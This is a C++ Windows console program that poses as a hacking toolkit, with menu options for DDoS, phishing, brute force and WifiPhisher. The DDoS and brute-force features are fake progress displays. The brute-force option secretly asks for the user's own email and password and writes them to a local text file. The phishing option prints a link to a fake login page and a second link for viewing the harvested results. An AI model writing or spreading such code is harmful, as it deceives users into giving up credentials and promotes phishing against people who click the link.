#include <iostream>
#include <windows.h>
#include <fstream>
#include <stdlib.h>
#include <stdio.h>
#include <conio.h>
#include <time.h>
#include <string>

using namespace std;

/* Void Header */
void header(){
	
	// Waktu
	 time_t now = time(0);
   	char* dt = ctime(&now);
	
	for(int i = 0; i < 80; i++){
		cout << "=";
	}
	cout << "\n				W E L C O M E\n" << endl;
	for(int i = 0; i < 80; i++){
		cout << "=";
	}
}

/* Void Loading */
void loading(){
	for(int i = 0; i < 80; i++){
		cout << "+";
		Sleep(90);
	}
}

/* Void Help*/
void help();

/* Void WP*/
void WP();

/* Void BFA*/
void BFA();

/* Void Phising*/
void Phising();

/* Void DDOS*/
void DDOS();

int main()
{
	main:
	//Warna font
	system("color a");
	
	/* Memamnggi Void Header */
	header();
	
	// Menu Utama
	string select;
	cout << endl;
	cout << endl;
	cout << "  	Select Menu" << endl;
	cout << "================================" << endl;
	cout << "[-D] DDOS Attack		" << endl;
	cout << "[-P] Phising		" << endl;
	cout << "[-B] Brute Force Attack	" << endl;
	cout << "[-W] WifiPhisher		" << endl;
	cout << "[-H] Help		" << endl;
	cout << "================================" << endl;
	cout << "[?] Select >> ";
	cin >> select;
	
	if(select == "-D"){
		DDOS();
	} else if(select == "-P"){
		Phising();
	} else if(select == "-B"){
		BFA();
	}else if(select == "-W"){
		WP();
	}else if(select == "-H"){
		help();
	}else{
		system("cls");
		cout << "Your Input Failed !!" << endl;
		system("timeout 15");
		system("cls");
		goto main;
	}
	
	getch();
	return 0;
}

void DDOS(){
	system("cls");
	header();
	cout << endl;
	string ddos;
	cout << "Masukan IP / Address W : ";
	cin >> ddos;
	
	ofstream filea;
	filea.open("Database/DDOS.txt", ios::app);
	filea << ddos << "\n" << endl;
	filea.close();
	system("cls");
	for(int d = 0; d <= 100; d++){
		cout << "Attacking " << ddos << " " << d << "%" << endl;
		Sleep(80);
	}
	system("timeout 15");
	system("cls");
	main();
}

void Phising(){
	system("cls");
	header();
	cout << endl;
	string pilih;
	cout << "What Social Media Do You Want To Use"<< endl;
	cout << ">> ";
	cin >> pilih;
	ofstream filea;
	filea.open("Database/Phising.txt", ios::app);
	filea << pilih << "\n" << endl;
	filea.close();
	
	for(int i = 0; i < 80; i++){
		cout << "+";
	}
	cout << "\nShare This Link? http://anwebsite.epizy.com/user-login.php "<< endl;
	cout << "And see the results at this link? http://anwebsite.epizy.com/daftar-user.php\n" << endl;
	system("pause");
	system("cls");
	main();
}

void BFA(){
	system("cls");
	header();
	cout << endl;
	string nomor_email;
	string password;
	string korban;
	cout << "Login Your Account !!" << endl;
	cout << endl;
	cout << "Your Number Or Email : ";
	cin >> nomor_email;
	cout << "Your Password : ";
	cin >> password;
	cout << "Name or ID Target : ";
	cin >> korban;
	
	ofstream File;
	File.open("Database/BFA.txt", ios::app);
	File << "==============================\nUsers \n============================== \nNumber or Email		: " << nomor_email << "\nPassword			: " << password << "\nTarget			: " << korban << "\n==============================\n\n\n";
	File.close();
	
	loading();
	system("cls");
	for(int d = 0; d <= 100; d++){
		cout << "Finding Password from This ID or Name " << korban << " " << d << "%" << endl;
		Sleep(1000);
	}
	cout << "\nPassword error not found ... Maybe you entered the wrong target ID" << endl;
	system("pause");
	system("cls");
	main();
}

void WP(){
	system("cls");
	header();
	cout << endl;
	cout << "Sorry, this tool is still under repair" << endl;
	system("pause");
	system("cls");
	main();
}

void help(){
	system("cls");
	header();
	cout << endl;
	cout << "# A few things to watch out for" << endl;
	cout << "1. Uppercase Lowercase" << endl;
	cout << "2. If Entering The Input No One Using Space" << endl;
	cout << endl;
	system("pause");
	system("cls");
	main();
}

